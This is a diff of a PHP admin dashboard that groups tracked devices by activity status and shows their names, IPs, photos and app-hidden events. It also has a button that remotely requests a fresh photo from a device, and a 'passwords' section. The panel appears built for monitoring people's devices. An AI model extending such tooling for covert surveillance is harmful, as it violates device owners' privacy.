@@ -116,7 +116,7 @@ $visits = array_reverse($visits);
 
 function getDevicePhoto($deviceId) {
     $path = "photos/{$deviceId}.jpg";
-    if (file_exists(__DIR__ . '/' . $path)) {
+    if (file_exists(__DIR__ . '/' . $path) && filesize(__DIR__ . '/' . $path) > 1000) {
         return $path . '?t=' . filemtime(__DIR__ . '/' . $path);
     }
     return null;
@@ -127,14 +127,34 @@ function getDeviceStatus($deviceId, $state, $visits) {
     if (in_array($deviceId, $bannedDevices, true)) return 'banned';
     $ip = $state[$deviceId]['ip'] ?? '';
     if ($ip && in_array($ip, $bannedIps, true)) return 'banned';
+    
     $lastSeen = $state[$deviceId]['last_seen'] ?? '';
     if (!$lastSeen) return 'offline';
-    if (time() - strtotime($lastSeen) <= 300) {
-        $lastEvent = 'unknown';
-        foreach ($visits as $v) { if (($v['deviceId']??'') === $deviceId) { $lastEvent = $v['event']??''; break; } }
-        if (in_array($lastEvent, ['app_hidden', 'app_pagehide', 'app_beforeunload'])) return 'offline';
-        return 'active';
+    
+    $secondsAgo = time() - strtotime($lastSeen);
+    
+    $lastEvent = 'unknown';
+    foreach ($visits as $v) { 
+        if (($v['deviceId']??'') === $deviceId) { 
+            $lastEvent = $v['event']??''; 
+            break; 
+        } 
     }
+
+    // Explicit close events
+    if (in_array($lastEvent, ['app_pagehide', 'app_beforeunload'])) {
+        return 'offline';
+    }
+
+    if ($secondsAgo < 300) { // 5 minutes
+        if ($lastEvent === 'app_hidden') {
+            return 'background';
+        }
+        return 'active';
+    } elseif ($secondsAgo < 1800) { // 30 minutes
+        return 'background';
+    }
+    
     return 'offline';
 }
 
@@ -142,6 +162,20 @@ $viewDevice = $_GET['device'] ?? '';
 $isProfileView = !empty($viewDevice) && isset($state[$viewDevice]);
 $isPasswordView = $section === 'passwords';
 $isBannedView = $section === 'banned';
+
+// Categorize devices for dashboard
+$onlineDevices = [];
+$backgroundDevices = [];
+$offlineDevices = [];
+
+if (!$isProfileView && !$isPasswordView && !$isBannedView) {
+    foreach ($state as $id => $d) {
+        $status = getDeviceStatus($id, $state, $visits);
+        if ($status === 'active') $onlineDevices[$id] = $d;
+        elseif ($status === 'background') $backgroundDevices[$id] = $d;
+        elseif ($status === 'offline') $offlineDevices[$id] = $d;
+    }
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -168,9 +202,13 @@ $isBannedView = $section === 'banned';
         .stat-card { background: var(--card-bg); border-radius: var(--radius); padding: 14px 18px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); flex: 1; min-width: 100px; }
         .stat-card .num { font-size: 28px; font-weight: 700; }
         .stat-card .label { font-size: 12px; color: var(--text-secondary); }
-        .device-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 14px; }
-        .device-card { background: var(--card-bg); border-radius: var(--radius); padding: 14px; display: flex; align-items: center; gap: 14px; text-decoration: none; color: inherit; box-shadow: 0 2px 8px rgba(0,0,0,0.06); }
-        .device-card .photo-thumb { width: 56px; height: 56px; border-radius: 10px; object-fit: cover; background: #e5e5ea; }
+        .device-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 10px; }
+        .device-card { background: var(--card-bg); border-radius: var(--radius); padding: 10px; display: flex; align-items: center; gap: 10px; text-decoration: none; color: inherit; box-shadow: 0 2px 8px rgba(0,0,0,0.04); border: 1px solid transparent; transition: all 0.2s; }
+        .device-card:hover { border-color: var(--primary); transform: translateY(-2px); }
+        .device-card .photo-thumb { width: 44px; height: 44px; border-radius: 8px; object-fit: cover; background: #e5e5ea; }
+        .device-card .name-box { flex: 1; min-width: 0; }
+        .device-card .name-text { font-weight: 700; font-size: 13px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .device-card .id-text { font-size: 10px; color: var(--text-secondary); }
         .profile-header { background: var(--card-bg); border-radius: var(--radius); padding: 24px; display: flex; gap: 24px; flex-wrap: wrap; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); }
         .profile-header .large-photo { width: 160px; height: 200px; border-radius: 10px; object-fit: cover; background: #e5e5ea; }
         .admin-table { width: 100%; border-collapse: collapse; }
@@ -206,7 +244,7 @@ $isBannedView = $section === 'banned';
                 <p>ID: <?=htmlspecialchars($viewDevice)?></p>
                 <p>IP: <?=htmlspecialchars($d['ip']??'—')?></p>
                 <p>Status: <?=getDeviceStatus($viewDevice, $state, $visits)?></p>
-                <p>Photo Status: <?=$photo ? '<span class="badge badge-success">HAS PHOTO</span>' : '<span class="badge">NO PHOTO</span>'?></p>
+                <p>Photo Status: <?=$photo ? '<span class="badge badge-success">HAS PHOTO</span>' : '<span class="badge" style="background:var(--danger);color:#fff;">MISSING PHOTO</span>'?></p>
                 <div style="display:flex;gap:10px;margin-top:20px;flex-wrap:wrap;">
                     <?php if ($isB): ?>
                         <a href="admin.php?key=<?=urlencode($key)?>&device=<?=urlencode($viewDevice)?>&action=unban" class="btn btn-success">Unban Device</a>
@@ -216,8 +254,8 @@ $isBannedView = $section === 'banned';
                     
                     <form method="POST">
                         <input type="hidden" name="action" value="request_photo">
-                        <button type="submit" class="btn btn-primary" <?=$reqPending?'disabled':''?>>
-                            <?=$reqPending ? '⌛ Photo Requested...' : '📷 Request Current Photo'?>
+                        <button type="submit" class="btn <?=$photo?'btn-primary':'btn-warning'?>" <?=$reqPending?'disabled':''?> style="box-shadow: 0 4px 14px rgba(0,0,0,0.1);">
+                            <?=$reqPending ? '⌛ Photo Requested...' : ($photo ? '📷 Request New Photo' : '📷 Request Photo (MISSING)')?>
                         </button>
                     </form>
                 </div>
@@ -281,24 +319,39 @@ $isBannedView = $section === 'banned';
             </div>
         </header>
         <div class="stats-bar">
-            <div class="stat-card"><div class="num"><?=count($state)?></div><div class="label">Devices</div></div>
+            <div class="stat-card"><div class="num"><?=count($onlineDevices)?></div><div class="label">🟢 Online</div></div>
+            <div class="stat-card"><div class="num"><?=count($backgroundDevices)?></div><div class="label">🟡 Background</div></div>
+            <div class="stat-card"><div class="num"><?=count($offlineDevices)?></div><div class="label">🔴 Offline</div></div>
             <div class="stat-card"><div class="num"><?=count($bannedDevices)?></div><div class="label">Banned</div></div>
         </div>
-        <div class="device-grid">
-            <?php foreach ($state as $id => $d): 
-                $status = getDeviceStatus($id, $state, $visits);
-                $photo = getDevicePhoto($id);
-            ?>
-                <a href="admin.php?key=<?=htmlspecialchars($key)?>&device=<?=urlencode($id)?>" class="device-card" style="<?=$status==='banned'?'opacity:0.5':''?>">
-                    <img src="<?=$photo ?: 'https://via.placeholder.com/60'?>" class="photo-thumb">
-                    <div style="flex:1;">
-                        <div style="font-weight:700;"><?=htmlspecialchars($d['name']??'Unknown')?></div>
-                        <div style="font-size:11px;color:var(--text-secondary);"><?=substr($id, 0, 10)?>...</div>
-                    </div>
-                    <span class="badge" style="background:<?=$status==='active'? 'var(--success)' : ($status==='banned'?'#000':'#ccc')?>;color:#fff;"><?=$status?></span>
-                </a>
-            <?php endforeach; ?>
-        </div>
+
+        <?php 
+        $sections = [
+            ['title' => '🟢 Online (Active Now)', 'devices' => $onlineDevices, 'color' => 'var(--success)'],
+            ['title' => '🟡 App Hidden (Background)', 'devices' => $backgroundDevices, 'color' => 'var(--warning)'],
+            ['title' => '🔴 Offline (Inactive)', 'devices' => $offlineDevices, 'color' => '#ccc']
+        ];
+        
+        foreach ($sections as $sec):
+            if (empty($sec['devices'])) continue;
+        ?>
+            <h3 style="margin: 20px 0 10px 0;"><?=$sec['title']?></h3>
+            <div class="device-grid">
+                <?php foreach ($sec['devices'] as $id => $d): 
+                    $status = getDeviceStatus($id, $state, $visits);
+                    $photo = getDevicePhoto($id);
+                ?>
+                    <a href="admin.php?key=<?=htmlspecialchars($key)?>&device=<?=urlencode($id)?>" class="device-card">
+                        <img src="<?=$photo ?: 'https://via.placeholder.com/60?text=No+Photo'?>" class="photo-thumb" style="<?=$photo?'':'border: 1px dashed #ccc;'?>">
+                        <div class="name-box">
+                            <div class="name-text"><?=htmlspecialchars($d['name']??'Unknown')?></div>
+                            <div class="id-text"><?=substr($id, 0, 14)?>...</div>
+                        </div>
+                        <span class="badge" style="background:<?=$sec['color']?>;color:#fff;font-size:9px;"><?=ucfirst($status)?></span>
+                    </a>
+                <?php endforeach; ?>
+            </div>
+        <?php endforeach; ?>
     <?php endif; ?>
     </div>
 </body>
